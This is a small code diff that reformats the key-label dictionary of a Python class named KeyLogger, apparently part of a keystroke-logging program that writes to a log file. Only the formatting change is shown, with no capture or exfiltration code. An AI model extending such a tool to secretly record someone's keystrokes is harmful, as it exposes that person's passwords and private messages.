@@ -7,8 +7,9 @@ from settings import path, logs_file
 class KeyLogger:
     """Keystroke tracking"""
     keys = {'Key.enter': '[ENTER]\n', 'Key.backspace': '[BACKSPACE]', 'Key.space': ' ',
-	        'Key.alt': '[ALT]', 'Key.delete': '[DEL]', 'Key.left': '[LEFT ARROW]', 'Key.right':
-            '[RIGHT ARROW]', 'Key.shift': '[SHIFT]', 'Key.caps_lock': '[CAPS LK]', 'Key.ctrl': '[CTRL]'}
+	        'Key.alt': '[ALT]', 'Key.delete': '[DEL]', 'Key.left': '[LEFT ARROW]',
+            'Key.right':'[RIGHT ARROW]', 'Key.shift': '[SHIFT]',
+            'Key.caps_lock': '[CAPS LK]', 'Key.ctrl': '[CTRL]'}
 
     def __init__(self):
         self.data = []
